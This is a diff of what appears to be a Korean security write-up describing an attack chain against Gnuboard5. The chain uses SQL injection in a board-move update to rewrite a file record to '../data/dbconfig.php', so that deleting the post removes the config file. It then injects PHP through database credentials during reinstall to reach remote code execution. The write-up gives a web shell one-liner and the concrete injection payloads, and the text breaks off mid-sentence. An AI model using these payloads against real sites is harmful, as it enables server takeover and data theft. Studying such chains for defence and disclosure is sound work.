@@ -9,9 +9,25 @@ $move_write_table = $g5['write_prefix'] . $move_bo_table;</code></pre>
 <pre><code>sql_query(" update $move_write_table set wr_parent = '$save_parent' where wr_id = '$insert_id' ");</code></pre>
 >그리고 위와 같이 sql_query함수를 이용하여 update 하는 SQL을 날려주는데 이때 테이블 clause에서 SQL Injection이 가능하고 update는 다른 테이블 참조 등이 가능합니다.
 
+<pre><code>        $sql = " insert into {$g5['board_file_table']}
+                    set bo_table = '{$bo_table}',
+                         wr_id = '{$wr_id}',
+                         bf_no = '{$i}',
+                         bf_source = '{$upload[$i]['source']}',
+                         bf_file = '{$upload[$i]['file']}',
+                         bf_content = '{$bf_content[$i]}',
+                         bf_download = 0,
+                         bf_filesize = '{$upload[$i]['filesize']}',
+                         bf_width = '{$upload[$i]['image']['0']}',
+                         bf_height = '{$upload[$i]['image']['1']}',
+                         bf_type = '{$upload[$i]['image']['2']}',
+                         bf_datetime = '".G5_TIME_YMDHIS."' ";
+        sql_query($sql);
+    }</code></pre>
 
+>그누보드에서 파일을 업로드하는 기능이 있는데 이 파일을 업로드 하면 위와 같이 "g5_board_file" 라는 테이블에 파일 명, 게시판 명, 게시글 번호 등등이 Insert 됩니다.
 
->그누보드에서 파일을 업로드하는 기능이 있는데 이 파일을 업로드 하면 "g5_board_file" 라는 테이블에 파일 명, 게시판 명, 게시글 번호 등등이 Insert되고 이 데이터를 기반으로 게시글에서는 파일 다운로드, 파일 삭제 등의 작업을 진행합니다.
+>이때 간단한 웹 쉘 코드인 "<?php system($_GET['cmd']); ?>" 등의 코드를 작성하여 업로드 합니다.
 
 <pre><code>        if (!delete_point($row['mb_id'], $bo_table, $row['wr_id'], '쓰기'))
             insert_point($row['mb_id'], $board['bo_write_point'] * (-1), "{$board['bo_subject']} {$row['wr_id']} 글삭제");
@@ -30,8 +46,38 @@ $move_write_table = $g5['write_prefix'] . $move_bo_table;</code></pre>
         // 에디터 썸네일 삭제
         delete_editor_thumbnail($row['wr_content']);</code></pre>
 
->위는 당시와 비슷한 버전의 delete.php인데 "g5_board_file" 테이블의 "bf_file" 컬럼의 값을 select하여 unlink 하는것을 알 수 있습니다.
->이 때 당시에는 "/data/dbconfig.php"를 삭제하여 다시 fwrite를 할 때 include 함수를 사용하여 LFI TO RCE를 했었습니다.
+>위는 당시와 비슷한 버전의 delete.php인데 위에서 insert 한 "g5_board_file" 테이블의 "bf_file" 컬럼의 값을 select하여 unlink 하는것을 알 수 있습니다.
+>이를 위의 SQL Injection을 이용하여 다음과 같은 페이로드를 이용하여 해당 게시글의 bf_file 컬럼의 값을 변경해주었습니다
 
+>"notice as a inner join `g5_board_file` as b set b.bf_file=0x2e2e2f646174612f6462636f6e6669672e706870 where wr_id=1 and bo_table=0x6e6f74696365#"
+
+<pre><code>$mysql_host  = $_POST['mysql_host'];
+$mysql_user  = $_POST['mysql_user'];
+$mysql_pass  = $_POST['mysql_pass'];
+$mysql_db    = $_POST['mysql_db'];
+$table_prefix= $_POST['table_prefix'];
+$admin_id    = $_POST['admin_id'];
+$admin_pass  = $_POST['admin_pass'];
+$admin_name  = $_POST['admin_name'];
+$admin_email = $_POST['admin_email'];
+
+$dblink = @mysql_connect($mysql_host, $mysql_user, $mysql_pass);</code></pre>
+
+<pre><code>$file = '../'.G5_DATA_DIR.'/'.G5_DBCONFIG_FILE;
+$f = @fopen($file, 'a');
+
+fwrite($f, "<?php\n");
+fwrite($f, "if (!defined('_GNUBOARD_')) exit;\n");
+fwrite($f, "define('G5_MYSQL_HOST', '{$mysql_host}');\n");
+fwrite($f, "define('G5_MYSQL_USER', '{$mysql_user}');\n");
+fwrite($f, "define('G5_MYSQL_PASSWORD', '{$mysql_pass}');\n");
+fwrite($f, "define('G5_MYSQL_DB', '{$mysql_db}');\n");
+fwrite($f, "define('G5_MYSQL_SET_MODE', {$mysql_set_mode});\n\n");
+fwrite($f, "define('G5_TABLE_PREFIX', '{$table_prefix}');\n\n");</pre></code>
+
+> "dbconfig.php" 파일이 삭제되면 그누보드에선 install이 되지 않았다고 판단하여 위와 같은 install_db.php를 이용하여 다시 dbconfig.php 파일을 write해줍니다.
+> 이 때 위와 같이 php코드를 패스워드나 db같은 부분에 본인의 mysql 서버에 " ');include($_GET['foo']);// "와 같은 DB or PASSWORD를 셋팅해주고 외부접속을 허용하여 "mysql_connect" 함수가 정상적으로 접근할 수 있게 맞춰줍니다.
+
+>이 후 dbconfig.php 파일은 모든 파일을 
 
 >그누보드에서는 각각의 게시판마다 g5_board 테이블에 있는 bo_include_head,bo_include_head 컬럼들의 값을 각각 상단 파일,하단 파일로 include합니다
